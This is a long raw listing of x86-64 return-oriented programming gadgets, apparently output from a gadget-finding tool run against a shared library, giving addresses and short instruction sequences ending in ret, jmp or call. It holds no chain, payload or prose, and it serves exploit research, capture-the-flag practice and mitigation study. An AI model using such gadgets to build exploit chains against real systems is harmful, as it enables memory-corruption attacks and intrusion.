0x00002aaaaac0ff69 : mov eax, dword ptr [rdi + 8] ; mov rax, qword ptr [rax + 0x48] ; jmp rax
0x00002aaaaac0eec1 : mov eax, dword ptr [rdi + 8] ; mov rax, qword ptr [rax + 8] ; jmp rax
0x00002aaaaac0eeb6 : mov eax, dword ptr [rdi + 8] ; mov rax, qword ptr [rax] ; jmp rax
0x00002aaaaac0cde9 : mov eax, dword ptr [rdi + 8] ; mov rsi, rbx ; mov rdi, r15 ; call qword ptr [rax]
0x00002aaaaac0efa1 : mov eax, dword ptr [rdi + 8] ; mov rsi, rsp ; call qword ptr [rax]
0x00002aaaaac008b7 : mov eax, dword ptr [rdi + 8] ; push 0 ; push 0x19 ; call qword ptr [rax]
0x00002aaaaab80a6d : mov eax, dword ptr [rdi + rax*4] ; test r8d, r8d ; jne 0xaba49 ; ret
0x00002aaaaac46d30 : mov eax, dword ptr [rdi - 4] ; cmp eax, dword ptr [rsi - 4] ; jne 0x171d4a ; xor eax, eax ; ret
0x00002aaaaab4c430 : mov eax, dword ptr [rdi] ; and eax, 0x200 ; ret
0x00002aaaaab4c400 : mov eax, dword ptr [rdi] ; and eax, 0x804 ; ret
0x00002aaaaab7ff5b : mov eax, dword ptr [rdi] ; cmp eax, dword ptr [rsi] ; jne 0xab0ba ; ret
0x00002aaaaac09d50 : mov eax, dword ptr [rdi] ; mov dword ptr [rdx], eax ; mov eax, 1 ; ret
0x00002aaaaab5184f : mov eax, dword ptr [rdi] ; mov qword ptr [rdx], rax ; ret
0x00002aaaaabe95b5 : mov eax, dword ptr [rdi] ; mov rdi, rdx ; jmp rax
0x00002aaaaab9cdb0 : mov eax, dword ptr [rdi] ; ret
0x00002aaaaab4cf00 : mov eax, dword ptr [rdi] ; shr eax, 4 ; and eax, 1 ; ret
0x00002aaaaab4cf10 : mov eax, dword ptr [rdi] ; shr eax, 5 ; and eax, 1 ; ret
0x00002aaaaac07454 : mov eax, dword ptr [rdi] ; test eax, eax ; jne 0x132466 ; ret
0x00002aaaaac07453 : mov eax, dword ptr [rdi] ; test eax, eax ; jne 0x132467 ; ret
0x00002aaaaac0d5b4 : mov eax, dword ptr [rdi] ; test eax, eax ; jne 0x1385c6 ; ret
0x00002aaaaac0d5b3 : mov eax, dword ptr [rdi] ; test eax, eax ; jne 0x1385c7 ; ret
0x00002aaaaab80b28 : mov eax, dword ptr [rdi] ; test eax, eax ; jne 0xabb28 ; xor eax, eax ; ret
0x00002aaaaab4c4c2 : mov eax, dword ptr [rdx + 0x20] ; sub rax, qword ptr [rdx + 0x18] ; sar rax, 2 ; ret
0x00002aaaaab4c3b2 : mov eax, dword ptr [rdx + 0x38] ; sub rax, qword ptr [rdx + 0x30] ; sar rax, 2 ; ret
0x00002aaaaab02e83 : mov eax, dword ptr [rdx + rax*4 + 0x200] ; ret
0x00002aaaaab7f1c7 : mov eax, dword ptr [rdx + rax*4] ; sub eax, dword ptr [rdx + rcx*4] ; je 0xaa1b9 ; ret
0x00002aaaaab660c6 : mov eax, dword ptr [rdx + rax*4] ; sub eax, ecx ; ret
0x00002aaaaabf37a2 : mov eax, dword ptr [rdx + rax*8 + 4] ; add rsp, 8 ; pop rbx ; pop rbp ; ret
0x00002aaaaac021c8 : mov eax, dword ptr [rdx + rax*8] ; jmp rax
0x00002aaaaab01b2d : mov eax, dword ptr [rdx + rdi*8 + 0x40] ; ret
0x00002aaaaab49630 : mov eax, dword ptr [rdx] ; add rsp, 0x18 ; pop rbx ; pop rbp ; ret
0x00002aaaaabbbf18 : mov eax, dword ptr [rdx] ; mov qword ptr [rdx], rdi ; ret
0x00002aaaaab47167 : mov eax, dword ptr [rdx] ; pop rbx ; ret
0x00002aaaaab455cc : mov eax, dword ptr [rdx] ; ret
0x00002aaaaab51841 : mov eax, dword ptr [rdx] ; test rax, rax ; jne 0x7c840 ; ret
0x00002aaaaac488a0 : mov eax, dword ptr [rip + 0x254e8a] ; test eax, eax ; jne 0x1738bb ; ret
0x00002aaaaac15334 : mov eax, dword ptr [rip + 0x2840d6] ; call qword ptr [rax]
0x00002aaaaac14d21 : mov eax, dword ptr [rip + 0x2846e9] ; call qword ptr [rax]
0x00002aaaaac0c791 : mov eax, dword ptr [rip + 0x28b701] ; add rsp, 8 ; ret
0x00002aaaaac0c761 : mov eax, dword ptr [rip + 0x28b799] ; add rsp, 8 ; ret
0x00002aaaaac0c701 : mov eax, dword ptr [rip + 0x28b881] ; add rsp, 8 ; ret
0x00002aaaaac0c731 : mov eax, dword ptr [rip + 0x28b8a9] ; add rsp, 8 ; ret
0x00002aaaaabfce01 : mov eax, dword ptr [rip + 0x29b1e1] ; mov rax, qword ptr fs:[rax] ; ret
0x00002aaaaac009b0 : mov eax, dword ptr [rip + 0x29c406] ; test eax, eax ; je 0x12b9ca ; ret
0x00002aaaaabfc74a : mov eax, dword ptr [rip + 0x2a0314] ; test eax, eax ; je 0x127762 ; ret
0x00002aaaaabf53e1 : mov eax, dword ptr [rip + 0x2a4491] ; ret
0x00002aaaaabe9981 : mov eax, dword ptr [rip + 0x2b2781] ; test rax, rax ; je 0x11499b ; ret
0x00002aaaaabde751 : mov eax, dword ptr [rip + 0x2b9719] ; mov eax, dword ptr [rax + 0x38] ; ret
0x00002aaaaabd6345 : mov eax, dword ptr [rip + 0x2c3465] ; pop rcx ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaab59c60 : mov eax, dword ptr [rip + 0x33e4de] ; test eax, eax ; js 0x84c7b ; ret
0x00002aaaaab5855f : mov eax, dword ptr [rip + 0x33f97b] ; mov qword ptr [rax], rdi ; ret
0x00002aaaaab56165 : mov eax, dword ptr [rip + 0x341c65] ; xor edi, edi ; call qword ptr [rax]
0x00002aaaaab55f40 : mov eax, dword ptr [rip + 0x341e8a] ; mov rdi, r14 ; call qword ptr [rax]
0x00002aaaaab51b11 : mov eax, dword ptr [rip + 0x347a09] ; ret
0x00002aaaaab0b880 : mov eax, dword ptr [rip + 0x38c802] ; ret
0x00002aaaaab0b870 : mov eax, dword ptr [rip + 0x38c816] ; ret
0x00002aaaaab0a300 : mov eax, dword ptr [rip + 0x39342a] ; test eax, eax ; jne 0x3531b ; ret
0x00002aaaaab029cc : mov eax, dword ptr [rip + 0x39541e] ; mov qword ptr [rax], rdx ; ret
0x00002aaaaaafec91 : mov eax, dword ptr [rip + 0x39ac59] ; ret
0x00002aaaaaaf6a51 : mov eax, dword ptr [rip + 0x3a68b9] ; ret
0x00002aaaaaaf6a41 : mov eax, dword ptr [rip + 0x3a68d9] ; ret
0x00002aaaaabe8d69 : mov eax, dword ptr [rsi + 0x18] ; mov dword ptr [rbp - 0x80], eax ; call r9
0x00002aaaaab030b1 : mov eax, dword ptr [rsi + 0x70] ; movsxd rdi, edi ; mov eax, dword ptr [rax + rdi*4] ; ret
0x00002aaaaab030c1 : mov eax, dword ptr [rsi + 0x78] ; movsxd rdi, edi ; mov eax, dword ptr [rax + rdi*4] ; ret
0x00002aaaaab8069f : mov eax, dword ptr [rsi + 8] ; mov dword ptr [rdi + 0xc], eax ; mov rax, rbx ; pop rbx ; ret
0x00002aaaaab01b49 : mov eax, dword ptr [rsi + rax*8 + 0x80] ; ret
0x00002aaaaab1d38c : mov eax, dword ptr [rsi + rbx*8] ; lea r9, qword ptr [rdx] ; jmp 0x483ea
0x00002aaaaab1ef6c : mov eax, dword ptr [rsi + rbx*8] ; lea r9, qword ptr [rdx] ; jmp 0x49fca
0x00002aaaaab0b555 : mov eax, dword ptr [rsi] ; and rax, qword ptr [rdx] ; mov qword ptr [rdi], rax ; xor eax, eax ; ret
0x00002aaaaabcad10 : mov eax, dword ptr [rsi] ; mov dword ptr [rdi + 0x108], eax ; xor eax, eax ; ret
0x00002aaaaab0b845 : mov eax, dword ptr [rsi] ; or rax, qword ptr [rdx] ; mov qword ptr [rdi], rax ; xor eax, eax ; ret
0x00002aaaaabe250b : mov eax, dword ptr [rsi] ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; ret
0x00002aaaaab470a7 : mov eax, dword ptr [rsi] ; pop rbx ; ret
0x00002aaaaab9cf5e : mov eax, dword ptr [rsp + 0x10] ; call rax
0x00002aaaaaafba17 : mov eax, dword ptr [rsp + 0x14] ; jmp 0x26832
0x00002aaaaaaf582a : mov eax, dword ptr [rsp + 0x18] ; call rax
0x00002aaaaab72d4b : mov eax, dword ptr [rsp + 0x18] ; mov dword ptr [rdi - 4], eax ; mov rax, rdi ; ret
0x00002aaaaabc4457 : mov eax, dword ptr [rsp + 0x18] ; mov rdx, rax ; jmp 0xef499
0x00002aaaaaaf936a : mov eax, dword ptr [rsp + 0x28] ; call rax
0x00002aaaaaaf9d05 : mov eax, dword ptr [rsp + 0x30] ; call rax
0x00002aaaaab0dfe7 : mov eax, dword ptr [rsp + 0x30] ; lea r15, qword ptr [rbx + r14] ; call rax
0x00002aaaaabe6fa5 : mov eax, dword ptr [rsp + 0x38] ; jmp 0x111f73
0x00002aaaaac17a97 : mov eax, dword ptr [rsp + 0x38] ; jne 0x142a82 ; add rsp, 0x48 ; ret
0x00002aaaaab0a839 : mov eax, dword ptr [rsp + 0xc] ; add rsp, 0x10 ; pop rbx ; ret
0x00002aaaaabcaf08 : mov eax, dword ptr [rsp + 0xc] ; add rsp, 0x18 ; ret
0x00002aaaaac17bde : mov eax, dword ptr [rsp + 0xc] ; add rsp, 0x38 ; ret
0x00002aaaaab8e454 : mov eax, dword ptr [rsp + 8] ; add rsp, 0x10 ; pop rbx ; ret
0x00002aaaaab10039 : mov eax, dword ptr [rsp + 8] ; add rsp, 0x18 ; ret
0x00002aaaaaba07ea : mov eax, dword ptr [rsp + 8] ; test rax, rax ; je 0xcb7fe ; call rax
0x00002aaaaabd2260 : mov eax, dword ptr [rsp - 0x50] ; ret
0x00002aaaaab689f4 : mov eax, dword ptr [rsp - 8] ; jne 0x938d4 ; ret
0x00002aaaaaba06c0 : mov eax, dword ptr [rsp] ; add rsp, 0x18 ; pop rbx ; pop rbp ; ret
0x00002aaaaab441b0 : mov eax, dword ptr [rsp] ; add rsp, 0x20 ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaabde7b3 : mov eax, dword ptr [rsp] ; add rsp, 0x38 ; ret
0x00002aaaaabde814 : mov eax, dword ptr [rsp] ; add rsp, 0x40 ; ret
0x00002aaaaabfc749 : mov eax, dword ptr es:[rip + 0x2a0314] ; test eax, eax ; je 0x127763 ; ret
0x00002aaaaabe2509 : mov eax, dword ptr fs:[r14] ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; ret
0x00002aaaaab5763d : mov eax, eax ; add rsp, 8 ; pop rbx ; pop rbp ; ret
0x00002aaaaabf8204 : mov eax, eax ; mov byte ptr [rdi + rdx], 0 ; ret
0x00002aaaaab7f1c5 : mov eax, eax ; mov eax, dword ptr [rdx + rax*4] ; sub eax, dword ptr [rdx + rcx*4] ; je 0xaa1bb ; ret
0x00002aaaaab0fc91 : mov eax, eax ; mov qword ptr [rdi + 8], rdx ; mov qword ptr [rdi], rax ; xor eax, eax ; ret
0x00002aaaaac06808 : mov eax, eax ; mov qword ptr [rdx], rax ; mov eax, 1 ; ret
0x00002aaaaaaf60b1 : mov eax, eax ; movsxd rax, dword ptr [rdx + rax*4] ; add rdx, rax ; jmp rdx
0x00002aaaaabd08ed : mov eax, eax ; pop rbp ; pop r12 ; pop r13 ; ret
0x00002aaaaab27c90 : mov eax, eax ; pop rbp ; pop r12 ; ret
0x00002aaaaabd09d9 : mov eax, eax ; pop rbx ; mov eax, r8d ; pop rbp ; pop r12 ; pop r13 ; ret
0x00002aaaaabd09a8 : mov eax, eax ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; ret
0x00002aaaaab1f807 : mov eax, eax ; pop rbx ; ret
0x00002aaaaab254ba : mov eax, eax ; ret
0x00002aaaaab4e12a : mov eax, ebp ; add rsp, 8 ; pop rbx ; pop rbp ; ret
0x00002aaaaabfe6ba : mov eax, ebp ; mov rcx, r14 ; mov rdi, r13 ; call r12
0x00002aaaaab4efbb : mov eax, ebp ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x00002aaaaab437db : mov eax, ebp ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; ret
0x00002aaaaab43ff9 : mov eax, ebp ; pop rbp ; pop r12 ; pop r13 ; ret
0x00002aaaaabd6c8b : mov eax, ebp ; pop rbx ; pop rbp ; pop r12 ; mov esi, 2 ; jmp rax
0x00002aaaaab4857b : mov eax, ebp ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; ret
0x00002aaaaab432b5 : mov eax, ebp ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; ret
0x00002aaaaab42363 : mov eax, ebp ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaab250e2 : mov eax, ebp ; pop rbx ; pop rbp ; ret
0x00002aaaaab1d433 : mov eax, ebx ; adc rax, rdx ; pop rbp ; pop rbx ; ret
0x00002aaaaab44662 : mov eax, ebx ; add rsp, 0x10 ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaab4ea9d : mov eax, ebx ; add rsp, 0x18 ; pop rbx ; pop rbp ; ret
0x00002aaaaab1f691 : mov eax, ebx ; add rsp, 0x440 ; pop rbx ; ret
0x00002aaaaac16c36 : mov eax, ebx ; add rsp, 0x88 ; pop rbx ; pop rbp ; ret
0x00002aaaaab692c7 : mov eax, ebx ; add rsp, 8 ; pop rbx ; pop rbp ; ret
0x00002aaaaabe9565 : mov eax, ebx ; and eax, 0xc ; cmp eax, 4 ; je 0x11457a ; ret
0x00002aaaaab9d574 : mov eax, ebx ; call rax
0x00002aaaaab3fc44 : mov eax, ebx ; je 0x6ac6a ; add rsp, 0x28 ; pop rbx ; pop rbp ; ret
0x00002aaaaab6a599 : mov eax, ebx ; jmp 0x953f3
0x00002aaaaabda23f : mov eax, ebx ; mov byte ptr [rdx], 0 ; pop rbx ; ret
0x00002aaaaab4597f : mov eax, ebx ; mov dword ptr [rbp], r12d ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaab08c39 : mov eax, ebx ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; ret
0x00002aaaaaaff836 : mov eax, ebx ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; ret
0x00002aaaaab42fea : mov eax, ebx ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaab076ab : mov eax, ebx ; pop rbx ; pop rbp ; ret
0x00002aaaaab0faaf : mov eax, ebx ; pop rbx ; ret
0x00002aaaaabd640a : mov eax, ebx ; pop rdx ; pop rbx ; ret
0x00002aaaaab1d2f7 : mov eax, ecx ; adc eax, eax ; ret
0x00002aaaaab0f68c : mov eax, ecx ; or rax, rdx ; ret
0x00002aaaaab5bead : mov eax, ecx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; ret
0x00002aaaaab5bf1a : mov eax, ecx ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; ret
0x00002aaaaab30774 : mov eax, ecx ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; ret
0x00002aaaaab08ea7 : mov eax, ecx ; ret
0x00002aaaaab1aa22 : mov eax, ecx ; shl eax, 0x1e ; or eax, edx ; ret
0x00002aaaaab7f068 : mov eax, ecx ; shr eax, 0xe ; and eax, 0x3fc00 ; pop rbx ; ret
0x00002aaaaab7f047 : mov eax, ecx ; shr eax, 6 ; and eax, 0x3fffc00 ; pop rbx ; ret
0x00002aaaaabea881 : mov eax, edi ; add rsp, 8 ; ret
0x00002aaaaab02f20 : mov eax, edi ; and eax, 0x7f ; ret
0x00002aaaaabed7c6 : mov eax, edi ; and eax, 0xffffff ; ret
0x00002aaaaabed7a0 : mov eax, edi ; bswap eax ; ret
0x00002aaaaab0f6a1 : mov eax, edi ; cqo ; idiv rsi ; ret
0x00002aaaaabd36d7 : mov eax, edi ; mov byte ptr [r8 - 1], 0 ; ret
0x00002aaaaab72e67 : mov eax, edi ; mov byte ptr [rdi + 6], 0 ; ret
0x00002aaaaaaf621b : mov eax, edi ; neg eax ; ret
0x00002aaaaab73965 : mov eax, edi ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; ret
0x00002aaaaab6b7aa : mov eax, edi ; pop rbx ; ret
0x00002aaaaaaf622e : mov eax, edi ; ret
0x00002aaaaabed7b0 : mov eax, edi ; ror ax, 8 ; ret
0x00002aaaaab0f632 : mov eax, edi ; sar edx, 0x1f ; xor eax, edx ; sub eax, edx ; ret
0x00002aaaaabed4aa : mov eax, edi ; sar rax, 6 ; ret
0x00002aaaaabed846 : mov eax, edi ; shr eax, 0x18 ; ret
0x00002aaaaab5a390 : mov eax, edx ; add rsp, 0x10 ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaab8fcd8 : mov eax, edx ; add rsp, 0x18 ; ret
0x00002aaaaabd2167 : mov eax, edx ; add rsp, 0x48 ; ret
0x00002aaaaab5863d : mov eax, edx ; add rsp, 8 ; pop rbx ; pop rbp ; ret
0x00002aaaaab52725 : mov eax, edx ; add rsp, 8 ; ret
0x00002aaaaac5d29c : mov eax, edx ; call qword ptr [rcx]
0x00002aaaaabe4f6c : mov eax, edx ; cmove eax, ecx ; ret
0x00002aaaaab6bdb6 : mov eax, edx ; cmove rax, rbx ; pop rbx ; ret
0x00002aaaaaba164b : mov eax, edx ; jle 0xcc65d ; ret
0x00002aaaaab9e02f : mov eax, edx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; ret
0x00002aaaaab1ca12 : mov eax, edx ; pop rbp ; pop r12 ; ret
0x00002aaaaab9e07b : mov eax, edx ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; ret
0x00002aaaaab29b8a : mov eax, edx ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; ret
0x00002aaaaab58ff7 : mov eax, edx ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaab1ac47 : mov eax, edx ; pop rbx ; pop rbp ; ret
0x00002aaaaab1e0b5 : mov eax, edx ; pop rbx ; ret
0x00002aaaaaaf68a5 : mov eax, edx ; ret
0x00002aaaaab09f01 : mov eax, edx ; sar eax, 0x10 ; ret
0x00002aaaaabab703 : mov eax, edx ; shr eax, 3 ; and eax, 1 ; pop rbx ; ret
0x00002aaaaabe94ac : mov eax, edx ; xchg dword ptr [rdi], eax ; test eax, eax ; jne 0x1144af ; pop rdx ; pop r10 ; ret
0x00002aaaaab9e3cf : mov eax, esi ; add rsp, 0x48 ; ret
0x00002aaaaac02c71 : mov eax, esi ; add rsp, 8 ; pop rbx ; pop rbp ; ret
0x00002aaaaab9dbb5 : mov eax, esi ; add rsp, 8 ; ret
0x00002aaaaab1f5be : mov eax, esi ; cmovae rax, rdi ; ret
0x00002aaaaab0a2e7 : mov eax, esi ; mov rsp, r8 ; mov rbp, r9 ; nop ; jmp rdx
0x00002aaaaab44c84 : mov eax, esi ; pop rbp ; pop r12 ; ret
0x00002aaaaab5b3c2 : mov eax, esi ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; ret
0x00002aaaaab9c953 : mov eax, esi ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; ret
0x00002aaaaab44a18 : mov eax, esi ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaab0f1d4 : mov eax, esi ; pop rbx ; pop rbp ; ret
0x00002aaaaab40633 : mov eax, esi ; pop rbx ; ret
0x00002aaaaab1f6f4 : mov eax, esi ; ret
0x00002aaaaac46f0b : mov eax, esi ; sub rax, rdx ; vzeroupper ; ret
0x00002aaaaab1d7c9 : mov eax, esp ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x00002aaaaabda37d : mov eax, esp ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; ret
0x00002aaaaab634ec : mov eax, esp ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; ret
0x00002aaaaab4147a : mov eax, esp ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaabe9564 : mov eax, r11d ; and eax, 0xc ; cmp eax, 4 ; je 0x11457b ; ret
0x00002aaaaabda37c : mov eax, r12d ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; ret
0x00002aaaaab467cb : mov eax, r13d ; pop rbp ; pop r12 ; pop r13 ; ret
0x00002aaaaac00e01 : mov eax, r13d ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; ret
0x00002aaaaab5143c : mov eax, r13d ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; ret
0x00002aaaaab9d9aa : mov eax, r14d ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; ret
0x00002aaaaabf8203 : mov eax, r8d ; mov byte ptr [rdi + rdx], 0 ; ret
0x00002aaaaabd08ec : mov eax, r8d ; pop rbp ; pop r12 ; pop r13 ; ret
0x00002aaaaab27c8f : mov eax, r8d ; pop rbp ; pop r12 ; ret
0x00002aaaaabd09a7 : mov eax, r8d ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; ret
0x00002aaaaab45fef : mov eax, r8d ; pop rbx ; ret
0x00002aaaaab254b9 : mov eax, r8d ; ret
0x00002aaaaac14987 : mov eax, r9d ; ret
0x00002aaaaac76f0d : mov ebp, 0x41380e0a ; ret
0x00002aaaaabd2979 : mov ebp, 0x441f0f66 ; add byte ptr [rax], al ; ret
0x00002aaaaab73541 : mov ebp, 0x448d48c0 ; cmp byte ptr [rax], ah ; ret
0x00002aaaaab73551 : mov ebp, 0x448d48c0 ; cmp byte ptr [rax], dh ; ret
0x00002aaaaab73531 : mov ebp, 0x448d48c0 ; cmp byte ptr [rax], dl ; ret
0x00002aaaaac2ddd7 : mov ebp, 0x63490003 ; adc al, 0x93 ; lea rdx, qword ptr [r11 + rdx] ; jmp rdx
0x00002aaaaab2d1ff : mov ebp, 0x830012d1 ; ret
0x00002aaaaac10943 : mov ebp, 0x8b48ffff ; cmp byte ptr [rax - 0x77], cl ; ret
0x00002aaaaabd8ab9 : mov ebp, 0x8b49fff1 ; call rbx
0x00002aaaaabd8ad4 : mov ebp, 0x8b49fff1 ; cmp al, 0x24 ; call rbx
0x00002aaaaabd8ac6 : mov ebp, 0x8b49fff1 ; jge 0x103ad4 ; call rbx
0x00002aaaaac5c0f5 : mov ebp, 0xbfc8fffd ; std ; dec dword ptr [rax] ; ret 0xfffd
0x00002aaaaac51824 : mov ebp, 0xc000000f ; sldt word ptr [rax] ; ret
0x00002aaaaac69751 : mov ebp, 0xc190fffb ; sti ; jmp rax
0x00002aaaaac5615d : mov ebp, 0xc1c0bfbe ; ret 0xc4c3
0x00002aaaaab735b1 : mov ebp, 0xea8348c0 ; adc byte ptr [rax + 1], cl ; ret 0x147c
0x00002aaaaab73591 : mov ebp, 0xea8348c0 ; and byte ptr [rax + 1], cl ; ret 0x347c
0x00002aaaaab73571 : mov ebp, 0xea8348c0 ; xor byte ptr [rax + 1], cl ; ret 0x547c
0x00002aaaaac43629 : mov ebp, 0xf66bdb2 ; out dx, eax ; shl dword ptr [rsi + 0xf], 1 ; cmp byte ptr [rdi], dl ; ret 0x830f
0x00002aaaaab73662 : mov ebp, 0xf80148c0 ; add rax, r8 ; ret
0x00002aaaaab618a8 : mov ebp, 0xf80148c0 ; ret
0x00002aaaaab61b2c : mov ebp, 0xf80148c6 ; ret
0x00002aaaaac58246 : mov ebp, 0xfb67d10d ; ret
0x00002aaaaab22c26 : mov ebp, 0xfffffb08 ; add byte ptr [rax - 0x77], cl ; ret 0x8948
0x00002aaaaab231b6 : mov ebp, 0xfffffb10 ; or byte ptr [rdi], cl ; xchg eax, esp ; ret 0x9522
0x00002aaaaab2b4af : mov ebp, 0xfffffb58 ; call rax
0x00002aaaaab21389 : mov ebp, 0xfffffb58 ; or byte ptr [rdi], cl ; xchg eax, esp ; ret 0x9522
0x00002aaaaaba3756 : mov ebp, 0xfffffcf8 ; call r12
0x00002aaaaabc0304 : mov ebp, 0xfffffefc ; add dword ptr [rdi], ecx ; xchg eax, esp ; ret 0x8341
0x00002aaaaabc0b16 : mov ebp, 0xfffffefc ; add dword ptr [rdi], ecx ; xchg eax, esp ; ret 0xf0e9
0x00002aaaaac08c41 : mov ebp, 0xffffff1c ; push qword ptr [rdi + rbp*4 - 0x18] ; ret 0x3a
0x00002aaaaabc0071 : mov ebp, 0xffffff78 ; call rbx
0x00002aaaaabb0a2e : mov ebp, cs ; add byte ptr [rax], al ; add byte ptr [rcx - 0x7d], al ; ret
0x00002aaaaac02c48 : mov ebp, dr1 ; dec dword ptr [rax - 0x77] ; ret 0xffb8
0x00002aaaaabd23ae : mov ebp, dword ptr [rax + rax] ; add rsp, 8 ; ret
0x00002aaaaaad6bf1 : mov ebp, dword ptr [rsi + rbx*8 + 0x6d] ; ret 0x1bb7
0x00002aaaaac0743c : mov ebp, eax ; call 0x12e714
0x00002aaaaab5aeff : mov ebp, eax ; call 0x82184
0x00002aaaaabd6c47 : mov ebp, eax ; call rax
0x00002aaaaab3a979 : mov ebp, eax ; jmp 0x653d5
0x00002aaaaac0c979 : mov ebp, eax ; mov r12d, dword ptr [rax] ; jmp 0x13798d
0x00002aaaaac78db1 : mov ebp, ebp ; jmp qword ptr [rbx]
0x00002aaaaac6b9c1 : mov ebp, ebp ; push qword ptr [rcx + rsi*4 - 0x739c0000] ; in eax, dx ; jmp rsp
0x00002aaaaabd75e9 : mov ebp, ebx ; mov rax, qword ptr [rbp - 0x48] ; call rax
0x00002aaaaac6aeb1 : mov ebp, ecx ; jmp rsp
0x00002aaaaab0a2ed : mov ebp, ecx ; nop ; jmp rdx
0x00002aaaaac6c599 : mov ebp, edi ; dec esp ; add al, byte ptr [rcx] ; add ah, dl ; mov ebp, edi ; jmp rsp
0x00002aaaaac6c5a1 : mov ebp, edi ; jmp rsp
0x00002aaaaab738ca : mov ebp, edi ; mov r12, rsi ; sub rsp, 8 ; call 0x8ab7b
0x00002aaaaab83028 : mov ebp, edi ; setne dl ; jmp 0xae03c
0x00002aaaaab85949 : mov ebp, edi ; setne dl ; jmp 0xb095c
0x00002aaaaab88100 : mov ebp, edi ; setne dl ; jmp 0xb311c
0x00002aaaaabd79ef : mov ebp, edi ; xor edx, edx ; xor esi, esi ; mov rbx, rax ; call rax
0x00002aaaaab528ad : mov ebp, edx ; call qword ptr [r15]
0x00002aaaaac00343 : mov ebp, edx ; mov rbx, rsi ; sub rsp, 8 ; call 0x13764b
0x00002aaaaabfea25 : mov ebp, esp ; call r15
0x00002aaaaabe9de4 : mov ebp, esp ; pop rbp ; ret
0x00002aaaaac78f29 : mov ebp, gs ; jmp qword ptr [rax]
0x00002aaaaac6b9c9 : mov ebp, gs ; jmp rsp
0x00002aaaaac48caa : mov ebx, 0x1f0fffea ; add bl, dh ; ret
0x00002aaaaabd8d42 : mov ebx, 0x1f0ffff1 ; add bl, dh ; ret
0x00002aaaaaad7d12 : mov ebx, 0x24d3e900 ; and eax, ebp ; clc ; ret
0x00002aaaaab52269 : mov ebx, 0x441f0f66 ; add byte ptr [rax], al ; xor eax, eax ; ret
0x00002aaaaabf4aa1 : mov ebx, 0x48002a4d ; add esp, 8 ; ret
0x00002aaaaac2df57 : mov ebx, 0x63490003 ; adc al, 0x93 ; lea rdx, qword ptr [r11 + rdx] ; jmp rdx
0x00002aaaaab2d398 : mov ebx, 0x83ffffe5 ; ret
0x00002aaaaab9dc34 : mov ebx, 0x8948002f ; ret 0x8d48
0x00002aaaaabedca9 : mov ebx, 0x8949002a ; ror byte ptr [rdi], 0x85 ; ret 0xfffe
0x00002aaaaabd8d26 : mov ebx, 0x8b48fff1 ; jge 0x103d34 ; call rbx
0x00002aaaaabd8d18 : mov ebx, 0x8b49fff1 ; cmp al, 0x24 ; call rbx
0x00002aaaaabd8d0a : mov ebx, 0x8b49fff1 ; jge 0x103d18 ; call rbx
0x00002aaaaaad8671 : mov ebx, 0x952a6c41 ; ret
0x00002aaaaaba9fb3 : mov ebx, 0xa4 ; add dword ptr [rdi], ecx ; lahf ; ret 0x82eb
0x00002aaaaabe9504 : mov ebx, 0xafb8341 ; je 0x114513 ; ret
0x00002aaaaac5615b : mov ebx, 0xbfbebdbc ; rol cl, 0xc2 ; ret
0x00002aaaaac066a6 : mov ebx, 0xc8 ; call rax
0x00002aaaaac695a0 : mov ebx, 0xd1fffdb5 ; mov bh, 0xfd ; call rcx
0x00002aaaaac695c0 : mov ebx, 0xd1fffdb6 ; mov bh, 0xfd ; call rcx
0x00002aaaaac437a9 : mov ebx, 0xf66bbb2 ; out dx, eax ; shl dword ptr [rsi + 0xf], 1 ; cmp byte ptr [rdi], dl ; ret 0x830f
0x00002aaaaab3480c : mov ebx, 2 ; jmp 0x5baf7
0x00002aaaaabe97f2 : mov ebx, dword ptr [rbp - 8] ; leave ; ret
0x00002aaaaac4867f : mov ebx, dword ptr [rdi + 0x10] ; call 0x1f8ad
0x00002aaaaabd79f6 : mov ebx, eax ; call rax
0x00002aaaaac5d508 : mov ebx, eax ; jmp qword ptr [rdi]
0x00002aaaaac026bb : mov ebx, eax ; jne 0x12d659 ; xor eax, eax ; pop rbx ; ret
0x00002aaaaabfab5f : mov ebx, eax ; mov byte ptr [r11], 0 ; ret
0x00002aaaaabd0ea7 : mov ebx, eax ; mov rax, rbx ; pop rbx ; ret
0x00002aaaaab0c307 : mov ebx, eax ; mov rdi, r12 ; call r15
0x00002aaaaab01376 : mov ebx, edi ; test rax, rax ; je 0x2c386 ; call rax
0x00002aaaaabd6c3f : mov ebx, edi ; xor esi, esi ; mov r12d, edx ; mov rbp, rax ; call rax
0x00002aaaaabe2445 : mov ebx, edx ; jmp 0x10d370
